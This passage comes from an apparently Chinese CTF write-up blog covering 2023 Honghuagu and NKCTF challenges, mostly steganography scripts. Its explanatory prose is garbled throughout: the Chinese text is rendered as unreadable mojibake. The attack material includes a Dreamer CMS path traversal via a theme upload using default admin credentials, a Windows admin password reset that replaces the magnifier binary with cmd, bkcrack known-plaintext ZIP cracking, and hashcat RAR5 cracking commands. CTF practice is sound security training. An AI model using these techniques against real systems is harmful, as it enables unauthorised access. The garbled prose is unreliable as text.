class="hljs-number">2</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">2</span>]%<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r1: &#x27;</span>+rgb[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#print(&#x27;glow: &#x27;+rgb[1])</span><br><span class="hljs-comment">#print(&#x27;blow: &#x27;+rgb[2])</span><br><br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>content = <span class="hljs-built_in">str</span>(rgb[<span class="hljs-number">0</span>])<br>file.write(content)<br>file.close()<br></code></pre></td></tr></table></figure>

<p>img-00001-00018.png</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">100100010010110001101000000000<br></code></pre></td></tr></table></figure>

<p>img-00001-00019.png</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">0110000110101001010000000000000<br></code></pre></td></tr></table></figure>

<p>img-00001-00020.png</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">0001011001000010000010000000001<br></code></pre></td></tr></table></figure>

<p>å°†ä¸‰å¼ å›¾ç‰‡æŒ‰é¡ºåºæ‹¼æ¥å‘ç°åˆšå¥½æ˜¯<code>10001001</code>ï¼Œ<code>0x89</code>ä¸º<code>PNG</code>çš„å¤´</p>
<p>ä½¿ç”¨è„šæœ¬åˆå¹¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r.txt&quot;</span>)<br>f2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r2.txt&quot;</span>)<br>f3 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r3.txt&quot;</span>)<br>d1=f1.read()<br>d2=f2.read()<br>d3=f3.read()<br><br>new=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(d1):<br>    new+=v+d2[i]+d3[i]<br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>file.write(new)<br>file.close()<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023hmg-5.png"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ç‚¹å‡»ç­¾åˆ°"><a href="#ç‚¹å‡»ç­¾åˆ°" class="headerlink" title="ç‚¹å‡»ç­¾åˆ°"></a>ç‚¹å‡»ç­¾åˆ°</h2><p>ç­¾åˆ°ï¼Œç‚¹ç‚¹ç‚¹</p>
<p><img src="/img/wp/2023/2023hmg-6.png"></p>
<h2 id="Dreamer-amp-amp-Dreamer-revenge"><a href="#Dreamer-amp-amp-Dreamer-revenge" class="headerlink" title="Dreamer &amp;&amp; Dreamer_revenge"></a>Dreamer &amp;&amp; Dreamer_revenge</h2><p>å‚è€ƒ<a href="https://forum.butian.net/share/2183#/">Dreamer CMS ä»£ç å®¡è®¡</a></p>
<p>é»˜è®¤åå°ç®¡ç†å‘˜è´¦å·å¯†ç ä¸º<code>wangjn/123456</code></p>
<p>åœ¨æºç ä¸­å¤åˆ¶ä¸€ä»½<code>\src\main\resources\db\dreamer-cms\templates\default_v2</code>ï¼Œä¿®æ”¹<code>theme.json</code>æ–‡ä»¶ä¸­çš„<code>themePath</code>ä¸º<code>../../../../../../../../../../../</code>ï¼Œç„¶åæ‰“åŒ…æˆå‹ç¼©åŒ…ï¼Œåœ¨åå°<code>é£æ ¼ç®¡ç†</code>å¤„ä¸Šä¼ </p>
<p><img src="/img/wp/2023/2023hmg-7.png"></p>
<p>å¯ç”¨ååœ¨<code>æ¨¡æ¿ç®¡ç†</code>å¤„å°±å¯ä»¥çœ‹åˆ°è·Ÿç›®å½•ä¸‹çš„æ–‡ä»¶äº†</p>
<p><img src="/img/wp/2023/2023hmg-8.png"></p>
<p><code>Dreamer_revenge</code>çš„æ­¥éª¤ä¸<code>Dreamer</code>ä¸€è‡´ï¼Œä¸è¿‡flagåœ¨<code>/proc/1/environ</code></p>
<p><img src="/img/wp/2023/2023hmg-9.png"></p>
<h2 id="Eyou"><a href="#Eyou" class="headerlink" title="Eyou"></a>Eyou</h2><p>EyouCMS v1.6.1 ååºåˆ—åŒ–æ¼æ´</p>
<p>å‚è€ƒ<a href="https://n1k0la-t.github.io/2023/01/28/EyouCMS%20v1.6.1%200day%E6%8C%96%E6%8E%98/">EyouCMS v1.6.1 0dayæŒ–æ˜</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2023</tag>
        <tag>çº¢æ˜è°·</tag>
      </tags>
  </entry>
  <entry>
    <title>2023NKCTF-wp</title>
    <url>/posts/50c22730/</url>
    <content><![CDATA[<p>rankï¼š15</p>
<p><img src="/img/wp/2023/2023nkctf-1.png"></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hard-misc"><a href="#hard-misc" class="headerlink" title="hard-misc"></a>hard-misc</h2><p><code>base32</code>ï¼Œå…¬ä¼—å·å‘<code>NKCTF2023æˆ‘æ¥äº†ï¼</code></p>
<h2 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h2><p>å…ˆå¯¼å…¥è¿›vmwareï¼Œå¼€æœºå‘ç°æ˜¯windows2008ç³»ç»Ÿï¼Œç”¨æˆ·å¸¦å¯†ç </p>
<p>æŒ‚è½½ä¸€ä¸ª2008çš„isoé•œåƒï¼Œè®¾ç½®å¯åŠ¨é¡¹ä¸ºcdä¼˜å…ˆï¼Œé‡å¯ï¼Œé€‰æ‹©ä¿®å¤è®¡ç®—æœºï¼Œè¿›å…¥å‘½ä»¤æç¤ºç¬¦</p>
<p><img src="/img/wp/2023/2023nkctf-2.png"></p>
<p>å¤åˆ¶ä¸€ä»½cmdåˆ°æ”¾å¤§é•œ</p>
<p><img src="/img/wp/2023/2023nkctf-3.png"></p>
<p>å·¦ä¸‹è§’å¯åŠ¨æ”¾å¤§é•œåŠŸèƒ½åå°±å¯åŠ¨äº†cmdï¼Œä¿®æ”¹administratorå¯†ç </p>
<p><img src="/img/wp/2023/2023nkctf-4.png"></p>
<p>è¿›å…¥ç³»ç»Ÿ</p>
<p><img src="/img/wp/2023/2023nkctf-5.png"></p>
<h2 id="easymusic"><a href="#easymusic" class="headerlink" title="easymusic"></a>easymusic</h2><p>æ ¹æ®æç¤ºç™¾åº¦æœåˆ°äº†ç±»ä¼¼çš„ä¸€é¢˜<a href="https://cloud.tencent.com/developer/article/1676153">2020å¤©ç¿¼æ¯-éŸ³é¢‘éšå†™</a></p>
<p>ä½¿ç”¨<code>OpenPuff</code>å·¥å…·</p>
<p>æ–‡ä»¶å°¾å¾—åˆ°<code>psdC:01374890</code></p>
<p>é¢‘è°±æ‰¾åˆ°<code>PSdB:74208645</code></p>
<p>æ³¢å½¢è½¬æ¢å¾—åˆ°<code>psdA:83979367</code></p>
<p>å¯¼å‡ºflag.txt</p>
<p><img src="/img/wp/2023/2023nkctf-6.png"></p>
<h2 id="easy-rgb"><a href="#easy-rgb" class="headerlink" title="easy_rgb"></a>easy_rgb</h2><p>montage+gapsç”»å›¾<br><code>montage *.png -tile 12X15 -geometry +0+0 flag.png</code><br><code>gaps --image=flag.png --generation=30 --population=300 --size=125</code></p>
<p>å¾—åˆ°keyï¼š<code>NKCTF2023</code></p>
<p><img src="/img/wp/2023/2023nkctf-7.png"></p>
<p><code>r</code>,<code>g</code>,<code>b</code>è½¬æˆ<code>zip</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">r=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;r.txt&#x27;</span>).read()<br>g=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;g.txt&#x27;</span>).read()<br>b=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.txt&#x27;</span>).read()<br>e=<span class="hljs-string">&quot;&quot;</span><br>m=<span class="hljs-built_in">max</span>([<span class="hljs-built_in">len</span>(r),<span class="hljs-built_in">len</span>(b),<span class="hljs-built_in">len</span>(g)])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    <span class="hljs-keyword">try</span>:<br>        e+=r[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=g[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=b[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°hintï¼š<code>AES-128</code>å’Œdataï¼š<code>IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+</code></p>
<p>åœ¨çº¿aes-128è§£å¯†ï¼Œkeyä¸º<code>NKCTF2023</code></p>
<h2 id="first-spam-of-rabbit-year"><a href="#first-spam-of-rabbit-year" class="headerlink" title="first spam of rabbit year"></a>first spam of rabbit year</h2><p><a href="https://www.spammimic.com/decode.cgi">åƒåœ¾é‚®ä»¶</a>è§£å¯†å¾—åˆ°<code>ä½›æ›°ï¼šæ —æ¥ç©†å©†æ‚‰é®ä¿±å‰å®¤åš§æ— ä½›å‰åŸµæ²™ä»–è’™è’™å”çš¤å•°çƒä¼½é©®æ•°è¿¦å¸æ¥è¨é‚£æ‘©åº¦é©®ä¼½åº¦è€¶è¨é‚£æ›³å–å†™æ€›é’µé®è€¶çƒåŸµå®¤æ‘©è¿¦å°¼è©å‘¼é˜‡æ —å¢€è±†å“†çƒåˆ©å‰èˆé˜¿è¨ä¿±å¤œåš§è’™å–å–è¯ƒç½šæ‚‰é˜‡å–æ— æ•°é‚£è¿¦é™€å®¤æ²™ç©†çš¤å—é™€å¨‘åˆ©çƒè¾“å¤œè¾“å‚é™€æ•°é†¯è¯ƒæè€¶é’µé®å¤œæ —è°¨ä¼½ä¿±è©åº¦å’©çƒå®¤é†¯è¿¦è¾“è¯ƒåº¦å”é˜‡é’µæ— ç¾¯æ —ææ‘©è°¨å’©æ‚‰å“†é˜‡å®¤æ‚‰é’µæ¥é‚£ä»–ä¼½å•°ä¼Šè€¶è°¨é‚£å°¼é‚£å‘¼ä¼Šç½šå¢è¾“å—å–è±†å¨‘ä¼½å”é†¯åš§é‚£åš§ç¾¯æ‘©å‰å‚å–é‚£é˜¿åœ°å¢€æ•°é™€æ¥å•°å­•ç½šåº¦é†¯è©è¨åŸµåŸµæ —ä»–ç©†è©å‚èˆè¿¦ç¾¯æ²™å•°å‰å°¼æ¥æ€›å°¼å­•è‹åœ°é®è‹ææ›³è°¨é˜‡é‚£å•°é˜‡å—æ›³è¾“æ›³ä¼Šè‹ä¼Šåº¦å•°å’©æè‹ä»–ä»–å¨‘é©®ä¿±å©†é’µå®¤åˆ©çƒä¿±ä¼½å†™åˆ©ç¾¯æ‚‰é˜‡é®çš¤ä½›å—æ‚‰é˜¿å¸è¨å–æ‚‰é˜‡å‚å‚æ¥ç½šçš¤è‹å–å¢€è¯ƒä»–å‰ä¼½æåˆ©å°¼åŸµå•°è¾“åš§é†¯å©†ä¼½å¢€è©å”å¨‘è°¨ä»–æ€›å†™æ²™ä¼½å•°çƒæ‘©æ —åŸµä¼Šå•°ä¿±æ¥å¸å†™åœ°å¢åˆ©æ€›å‰å¸é™€é˜¿å”µä¼Šä¼½è°¨æ›³é˜‡ç¾¯å¨‘ç¾¯åš§åŸµå”çƒæ¥å–æ›³è¾“ä»–é˜¿å®¤é’µè°¨å•°æ¥ä»–å‘¼å¨‘å–è©å“†è’™ç©†è¯ƒå©†çƒä»–å¤œå­•ç©†è¯ƒé’µä½›å‚å®¤æ‚‰èˆè¨ç©†å®¤é®é˜¿å–å•°ä¼½è€¶å–æ¼«</code></p>
<p>ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚è§£å¯†å¾—åˆ°<code>rabbit åˆ move</code></p>
<p>ä½›æ›°åŠ ä¸ªåˆï¼Œkeyæ˜¯<code>rabbit</code>ï¼Œè§£å¯†å¾—åˆ°å¯†æ–‡</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">&amp;â€‹â€‹â€‹â€‹â€â€â€auD5â€‹â€‹â€‹â€‹â€â€â€‹v&#x27;&lt;)â€‹â€‹â€‹â€‹â€â€â€Œ`hâ€‹â€‹â€‹â€‹â€â€‹â€&#123;dF6C_*&#x27;Jrcqzrh&amp;ZaF&gt;`g^â€‹â€‹â€‹â€‹â€â€â€ŒHr&#x27;&#125;vuHZJBâ€‹â€‹â€‹â€‹â€â€‹â€%~&#125;_H5?guâ€‹â€‹â€‹â€‹â€Œâ€â€;qâ€‹â€‹â€‹â€‹â€â€â€Œ)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13<br></code></pre></td></tr></table></figure>

<p>0å®½å¾—åˆ°keyï¼š<code>EnoOoO1G</code></p>
<p>æ ¹æ®ç»“å°¾çš„æç¤ºï¼Œå¯†æ–‡rot47ï¼Œkey rot13</p>
<p>å¾—åˆ°<code>U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH</code>å’Œ<code>RabBbB1T</code></p>
<p>åœ¨çº¿rabbitå¾—åˆ°<code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></p>
<h2 id="misc-iot"><a href="#misc-iot" class="headerlink" title="misc?iot!"></a>misc?iot!</h2><p><a href="https://www.anquanke.com/post/id/229321">å‚è€ƒæ–‡ç« </a></p>
<p>é€‰æ‹©<code>arm little-endian</code></p>
<p>å¦‚æœè¦å†™åœ°å€é»˜è®¤ä¸º<code>0x8000000</code></p>
<p><img src="/img/wp/2023/2023nkctf-8.png"></p>
<p>sub_800014Cæ˜¯rc4ç”Ÿæˆå¯†é’¥çš„è¿‡ç¨‹</p>
<p><img src="/img/wp/2023/2023nkctf-9.png"></p>
<p>å¤åˆ¶å¯†é’¥çš„è¿‡ç¨‹ï¼Œå¾—åˆ°keyï¼š<code>NKCTF2023</code></p>
<p><img src="/img/wp/2023/2023nkctf-10.png"></p>
<p>ä»V5å¼€å§‹çš„18ä¸ªå­—èŠ‚æ˜¯å¯†æ–‡ï¼Œå°ç«¯åºæå–å‡ºæ¥ï¼š<code>245F02E287A0A76C072A75DA3F8A57D71A1F</code></p>
<p><img src="/img/wp/2023/2023nkctf-11.png"></p>
<p>åœ¨çº¿rc4è§£å¯†å¾—åˆ°<code>NKCTF&#123;H3l10_stm32&#125;</code></p>
<h2 id="easy-word"><a href="#easy-word" class="headerlink" title="easy_word"></a>easy_word</h2><p>æ ¹æ®æ³¨é‡Šä¸­çš„æç¤ºçˆ†ç ´å¯†ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>base=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>**<span class="hljs-number">4</span>):<br>    d=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        d.append(base[j%<span class="hljs-number">62</span>])<br>        j=j//<span class="hljs-number">62</span><br>    d=<span class="hljs-built_in">tuple</span>(d)<br>    e=<span class="hljs-string">&quot;h%s%svO%s%s0&quot;</span>%d<br>    <span class="hljs-built_in">hash</span>=hashlib.sha256(e.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;b75d1224&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">hash</span>[:<span class="hljs-number">8</span>]:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure>

<p>æ”¹æˆzipè§£å‹ï¼Œ<code>media</code>ç›®å½•ä¸‹æœ‰ä¸€å¼ <code>image1.png</code>ï¼Œå›¾ç‰‡ä¸Šæœ‰keyï¼š<code>Welcome_to_NKCTF</code></p>
<p><code>cloacked-pixel</code>å¾—åˆ°flag</p>
<p><img src="/img/wp/2023/2023nkctf-12.png"></p>
<h2 id="ä¸‰ä½“"><a href="#ä¸‰ä½“" class="headerlink" title="ä¸‰ä½“"></a>ä¸‰ä½“</h2><p>stegsolveè§‚å¯Ÿå‘ç°<code>green</code>å’Œ<code>blue</code>æœ‰æ•°æ®ï¼Œè„šæœ¬æå–</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;3.bmp&#x27;</span>)<br>d=a.getdata()<br>w,h=a.size<br>e=[]<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        i=a.getpixel((x,y))<br>        e.append(<span class="hljs-built_in">chr</span>((i[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+i[<span class="hljs-number">2</span>]))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(e))<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>NKCTF&#123;3d77dc1a37b2d1ebf489c973f554ea10&#125;</code></p>
<h2 id="easy-bmp"><a href="#easy-bmp" class="headerlink" title="easy_bmp"></a>easy_bmp</h2><p>åœ¨010ä¸­åˆ†åˆ«ä¿®æ”¹é«˜å’Œå®½ï¼Œå¾—åˆ°keyï¼š<code>BMP_Height_width_easy</code></p>
<p><img src="/img/wp/2023/2023nkctf-13.png"></p>
<p>è§£å‹åå¾—åˆ°<code>flag.bmp</code>ï¼Œç»§ç»­çˆ†ç ´å®½é«˜ï¼Œ<code>360*360</code>ï¼Œæ‰«äºŒç»´ç å¾—åˆ°flag</p>
<p><code>NKCTF&#123;eab1291e-9e37-4ff1-b76d-f1af63eaad43&#125;</code></p>
<h2 id="baby-music"><a href="#baby-music" class="headerlink" title="baby_music"></a>baby_music</h2><p>010æ‰“å¼€ï¼Œå‘ç°å¾ˆå¤šé‡å¤çš„<code>10 27</code>å’Œ<code>11 27</code></p>
<p>å°†<code>10 27</code>è½¬ä¸º<code>0</code>ï¼Œ<code>11 27</code>è½¬ä¸º<code>1</code></p>
<p>äºŒè¿›åˆ¶è½¬æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.wav&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()[<span class="hljs-number">0x2c</span>:]<br>e=[]<br>q=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">if</span> d[i]==<span class="hljs-number">0x10</span>:<br>        q+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        q+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(q)==<span class="hljs-number">8</span>:<br>        e.append(<span class="hljs-built_in">int</span>(q,<span class="hljs-number">2</span>))<br>        q=<span class="hljs-string">&quot;&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure>

<p>å‘ç°æ˜¯<code>zip</code></p>
<p>æ³¨é‡Šä¸­<code>0</code>è½¬ä¸º<code>.</code>ï¼Œ<code>1</code>è½¬ä¸º<code>-</code>ï¼Œ<code>æ¢è¡Œ</code>è½¬ä¸º<code>/</code></p>
<p><code>.--/./.-../-.-./---/--/./-/---/-./-.-/-.-./-/..-./--..--/-/...././.--./.-/.../.../.--/---/.-./-../../.../.----/-..../-.../-.--/-/./.../.-./.-/-./-../---/--/.-../-.--/--././-././.-./.-/-/./-../--..--/../.../-/...././.-././.-/-..././-/-/./.-./.--/.-/-.--/-/---/..-/-./.-../---/-.-./-.-/-/...././--../../.--./..--..</code></p>
<p>è§£æ‘©æ–¯å¾—åˆ°<br><code>WELCOME TO NKCTF,THEPASSWORDIS16BYTESRANDOMLYGENERATED,ISTHEREABETTERWAYTOUNLOCKTHEZIP?</code></p>
<p>æ ¹æ®æç¤ºï¼ŒçŒœæµ‹æ˜¯æ·±å…¥æ˜æ–‡æ”»å‡»</p>
<p>å…ˆæ„é€ å·²çŸ¥çš„æ˜æ–‡ï¼Œå³<code>flag.png</code>çš„æ–‡ä»¶å¤´åŠ <code>IHDR</code>ï¼Œå†™å…¥åˆ°<code>plain.txt</code></p>
<p>plain.txtï¼š<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code></p>
<p>ä½¿ç”¨<code>bkcrack</code>çˆ†ç ´key</p>
<p><code>bkcrack.exe -C flag.zip -c flag.png -p plain.txt</code></p>
<p>ä¿®æ”¹<code>flag.zip</code>çš„å¯†ç </p>
<p><code>bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy</code></p>
<p><img src="/img/wp/2023/2023nkctf-14.png"></p>
<p>è§£å‹å¾—åˆ°flag</p>
<p><code>NKCTF&#123;You_are_very_smart!!&#125;</code></p>
<h2 id="THMaster"><a href="#THMaster" class="headerlink" title="THMaster"></a>THMaster</h2><p>å…ˆå¼€å¯<code>THmaster.exe</code>ç›‘å¬ï¼Œå†å¼€å¯<code>th12.exe</code></p>
<p>ceä¿®æ”¹åˆ†æ•°åˆ°2äº¿å¤š</p>
<p><img src="/img/wp/2023/2023nkctf-15.png"></p>
<p>åœ¨<code>replay</code>æ–‡ä»¶å¤¹ä¸‹çš„<code>th12_01.rpy</code>ä¸­æ‰¾åˆ°flag</p>
<h2 id="easypic"><a href="#easypic" class="headerlink" title="easypic"></a>easypic</h2><p><strong>èµ›åå¤ç°</strong></p>
<p>æç¤º<code>å‡ºé¢˜äººæŠŠflagå·å·è—åœ¨äº†åŠ å¯†ç›˜é‡Œäº†ï¼Œä½ çŸ¥é“æ€ä¹ˆæŠŠå®ƒè¿˜åŸå‡ºæ¥å—</code></p>
<p>å…ˆå°†å›¾ç‰‡åå¤šä½™çš„æ•°æ®åˆ†ç¦»ï¼Œä½¿ç”¨<code>veracrypt</code>æŒ‚è½½ï¼Œå¯†é’¥ä¸ºåˆ†ç¦»å‡ºçš„<code>png</code></p>
<p><img src="/img/wp/2023/2023nkctf-16.png"></p>
<p>å¾—åˆ°<code>flag.png</code>ï¼Œå›¾ç‰‡å°¾å¾—åˆ°<code>Tips:566*566</code></p>
<p>æ”¾å¤§å›¾ç‰‡è§‚å¯Ÿåˆ°å¾ˆå¤šåƒç´ ç‚¹ï¼Œæå–ç„¶åæ‹¼æ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>img=img.resize((<span class="hljs-number">566</span>,<span class="hljs-number">566</span>),Image.NEAREST)<br>img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°flag<br><code>NKCTF&#123;49ce8740502743585c4a44404e62d8f9&#125;</code></p>
<h2 id="äº”å¹´Miscï¼Œä¸‰å¹´æ¨¡æ‹Ÿ"><a href="#äº”å¹´Miscï¼Œä¸‰å¹´æ¨¡æ‹Ÿ" class="headerlink" title="äº”å¹´Miscï¼Œä¸‰å¹´æ¨¡æ‹Ÿ"></a>äº”å¹´Miscï¼Œä¸‰å¹´æ¨¡æ‹Ÿ</h2><p><strong>èµ›åå¤ç°(å¥—å¨ƒé¢˜)</strong></p>
<p>å‹ç¼©åŒ…æ³¨é‡Š<code>printf(&quot;%d%d%d%d%d%d&quot;,key[]);</code></p>
<p>6ä½æ•°å­—çˆ†ç ´ï¼Œå¾—åˆ°<code>114514</code></p>
<p>æç¤º1ï¼š<code>â€œCA1Nâ€ä¹Ÿå¾ˆâ€œç–‘æƒ‘â€å‘¢</code></p>
<p>çŒœæµ‹æ˜¯è¦å¯¹æ–‡ä»¶å¼‚æˆ–</p>
<p>æ–‡ä»¶å¤´ä¸º<code>13 08 40 47</code>ï¼Œä¸å¸¸è§æ–‡ä»¶å¤´è¿›è¡Œå¼‚æˆ–å¯¹æ¯”ï¼Œå‘ç°å¼‚æˆ–<code>0x43</code>åä¸º<code>zip</code></p>
<p>å¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œæ ¹æ®æç¤º2<code>ZipCrypto</code>ï¼ŒçŒœæµ‹æ˜¯æ·±å…¥æ˜æ–‡æ”»å‡»</p>
<p><code>echo -n &quot;handsome&quot; &gt; plain.txt</code><br><code>bkcrack -C out.zip -c handsome.zip -p plain.txt -o 30 -x 0 504b0304</code></p>
<p><img src="/img/wp/2023/2023nkctf-17.png"></p>
<p>æ”¹å¯†ç </p>
<p><code>bkcrack -C out.zip -k 0247f1a3 5da9d4ac 1ae8312c -U 1.zip easy</code></p>
<p>è§£å‹å‡ºæ¥ä¸€ä¸ª<code>handsome.jpg</code>å’Œå¸¦å¯†ç çš„<code>5.rar</code></p>
<p>è‡ªæ‹ç…§å¹¶æ²¡ä»€ä¹ˆç”¨ï¼Œhashcatçˆ†ç ´<code>rar</code></p>
<p>rar2johnæå–hash<br><code>$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602</code></p>
<p>hashcatçˆ†ç ´å¯†ç <br><code>hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u</code></p>
<p>æœ€ç»ˆå¾—åˆ°å¯†ç <code>BUSADJ</code></p>
<p><img src="/img/wp/2023/2023nkctf-18.png"></p>
<p>è§£å‹å‡ºçš„å›¾ç‰‡å°¾è—äº†ä¸€ä¸ªé€†åºçš„png</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;5.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;6.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>

<p>ä¿®æ”¹é«˜åº¦ï¼Œå¾—åˆ°å‹ç¼©åŒ…çš„å¯†ç <code>be8b06bc13780abf</code></p>
<p>è§£å‹å‡ºçš„<code>GGGGGGG.png</code>ç»“å°¾æœ‰ä¸²å­—ç¬¦<code>5D93CEB70E2BF5DAA84EC3D0CD2C731A</code></p>
<p>32ä½çš„ï¼Œæ¨æµ‹ä¸ºmd5ï¼Œåœ¨çº¿ç½‘ç«™å¾—åˆ°<code>qwer1234</code></p>
<p><img src="/img/wp/2023/2023nkctf-19.png"></p>
<p>æ‹¿è¿™ä¸ªå¯†ç å»è·‘<code>cloacked-pixel</code>ï¼Œå¾—åˆ°ä¸‹ä¸€å±‚å‹ç¼©åŒ…å¯†ç <code>f442212b3d398a8e</code></p>
<p>æ ¹æ®æç¤ºæ˜¯steghideçˆ†ç ´ï¼Œé‚£ç›´æ¥ç”¨stegseekè·‘äº†ï¼Œå¾—åˆ°ä¸‹ä¸€å±‚å¯†ç <code>764dc6c0361fc0fd</code></p>
<p>çœ‹æ–‡ä»¶å¤´ï¼Œæ˜æ˜¾çš„F5éšå†™ï¼Œå¾—åˆ°ä¸‹ä¸€å±‚å¯†ç <code>un7pXkXMD6J5P5jKzP3FCCVJ4VFtTF26</code></p>
<p>wavæ–‡ä»¶ï¼Œä¸€å¬å°±æ˜¯sstväº†ï¼Œå¾—åˆ°<code>NKCTF&#123;iLiKECTFbec@u5eDreaM!&#125;</code></p>
<p><img src="/img/wp/2023/2023nkctf-20.png"></p>
